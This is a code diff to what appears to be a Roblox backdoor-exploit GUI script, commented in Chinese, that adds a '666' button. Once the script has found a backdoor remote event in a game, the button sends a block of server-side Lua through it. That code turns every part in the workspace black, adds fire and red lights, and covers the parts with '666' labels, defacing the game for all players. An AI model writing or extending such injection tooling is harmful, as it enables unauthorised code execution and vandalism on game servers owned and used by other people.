@@ -189,6 +189,23 @@ particleButton.Parent = buttonContainer
 particleButton.ZIndex = 3
 buttons[6] = particleButton
 
+-- 在跳脸1下方20像素处添加666按钮
+local button666 = Instance.new("TextButton")
+button666.Name = "Button7"
+button666.Size = UDim2.new(buttonSettings.widthRatio, 0, buttonSettings.heightRatio, 0)
+-- 计算位置：跳脸1按钮下方20像素
+local button666Y = newButtonY + buttonSettings.heightRatio + pixelOffsetRatio
+button666.Position = UDim2.new(calculatedStartX, 0, button666Y, 0) -- 与跳脸1按钮对齐
+button666.BackgroundColor3 = Color3.new(0.2, 0, 0) -- 深红色背景
+button666.BorderColor3 = Color3.new(1, 0, 0) -- 红色边框
+button666.BorderSizePixel = 2
+button666.Text = "666"
+button666.TextColor3 = Color3.new(1, 0, 0) -- 红色文字
+button666.TextScaled = true
+button666.Parent = buttonContainer
+button666.ZIndex = 3
+buttons[7] = button666
+
 -- Backdoor Detection System
 local dateTimeNow = DateTime.now
 local tableFind = table.find
@@ -562,6 +579,106 @@ local function executeParticleScript()
     notify("✅ 粒子特效已应用！所有玩家角色现在都有粒子效果！")
 end
 
+-- 666恐怖效果函数
+local function execute666Script()
+    if not attached or not backdoor then
+        notify("❌ 请先检测后门！")
+        return
+    end
+    
+    local code666 = [[
+        -- 完整的666恐怖效果
+        local function Apply666Effects()
+            local function ApplyEffectsToObject(object)
+                for _, child in pairs(object:GetChildren()) do
+                    if child:IsA("BasePart") then
+                        -- 将部件变为黑色
+                        child.BrickColor = BrickColor.new("Really black")
+                        child.TopSurface = Enum.SurfaceType.Smooth
+                        child.BottomSurface = Enum.SurfaceType.Smooth
+
+                        -- 添加红色选择框
+                        local selectionBox = Instance.new("SelectionBox")
+                        selectionBox.Adornee = child
+                        selectionBox.Color = BrickColor.new("Really red")
+                        selectionBox.Parent = child
+
+                        -- 添加红色点光源
+                        local pointLight = Instance.new("PointLight")
+                        pointLight.Color = Color3.new(1, 0, 0)
+                        pointLight.Range = 15
+                        pointLight.Brightness = 5
+                        pointLight.Parent = child
+
+                        -- 添加火焰效果
+                        local fire = Instance.new("Fire")
+                        fire.Size = 19
+                        fire.Heat = 22
+                        fire.Parent = child
+
+                        -- 创建BillboardGui和TextLabel
+                        local billboard = Instance.new("BillboardGui")
+                        billboard.Name = "stuf"
+                        billboard.Adornee = child
+                        billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
+                        billboard.Parent = child
+
+                        local textLabel = Instance.new("TextLabel")
+                        textLabel.Text = "666 666 666 666 666 666"
+                        textLabel.Font = Enum.Font.SourceSansBold
+                        textLabel.TextSize = 48
+                        textLabel.TextColor3 = Color3.new(1, 0, 0)
+                        textLabel.Size = UDim2.new(1, 0, 1.25, 0)
+                        textLabel.Position = UDim2.new(0, -22, -0.1, 0)
+                        textLabel.BackgroundTransparency = 1
+                        textLabel.Parent = billboard
+                    end
+
+                    -- 递归处理子对象
+                    if #child:GetChildren() > 0 then
+                        ApplyEffectsToObject(child)
+                    end
+                end
+            end
+
+            -- 对整个工作空间应用效果
+            ApplyEffectsToObject(game.Workspace)
+
+            -- 对工作空间的直接子对象也应用效果
+            for _, obj in pairs(workspace:GetChildren()) do
+                if obj:IsA("BasePart") then
+                    local billboard = Instance.new("BillboardGui")
+                    billboard.Name = "stuf"
+                    billboard.Adornee = obj
+                    billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
+                    billboard.Parent = obj
+
+                    local textLabel = Instance.new("TextLabel")
+                    textLabel.Text = "666 666 666 666 666 666"
+                    textLabel.Font = Enum.Font.SourceSansBold
+                    textLabel.TextSize = 48
+                    textLabel.TextColor3 = Color3.new(1, 0, 0)
+                    textLabel.Size = UDim2.new(1, 0, 1.25, 0)
+                    textLabel.Position = UDim2.new(0, -22, -0.1, 0)
+                    textLabel.BackgroundTransparency = 1
+                    textLabel.Parent = billboard
+                end
+            end
+        end
+
+        -- 调用函数以应用效果
+        Apply666Effects()
+    ]]
+    
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(code666)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(code666)
+    end
+    
+    notify("✅ 666恐怖效果已应用！")
+end
+
 -- 自动检测并执行天空盒修改函数
 local function autoDetectAndExecuteSkybox()
     if not attached or not backdoor then
@@ -618,6 +735,20 @@ local function autoDetectAndExecuteParticles()
     end
 end
 
+-- 自动检测并执行666效果函数
+local function autoDetectAndExecute666()
+    if not attached or not backdoor then
+        if scanGame() then
+            task.wait(0.5)
+            execute666Script()
+        else
+            notify("❌ 未找到后门，无法应用666效果！")
+        end
+    else
+        execute666Script()
+    end
+end
+
 -- Button 1: Backdoor Detection
 buttons[1].MouseButton1Click:Connect(function()
     attached = false
@@ -651,4 +782,9 @@ end)
 -- Button 6: 粒子
 buttons[6].MouseButton1Click:Connect(function()
     autoDetectAndExecuteParticles()
+end)
+
+-- Button 7: 666效果
+buttons[7].MouseButton1Click:Connect(function()
+    autoDetectAndExecute666()
 end)
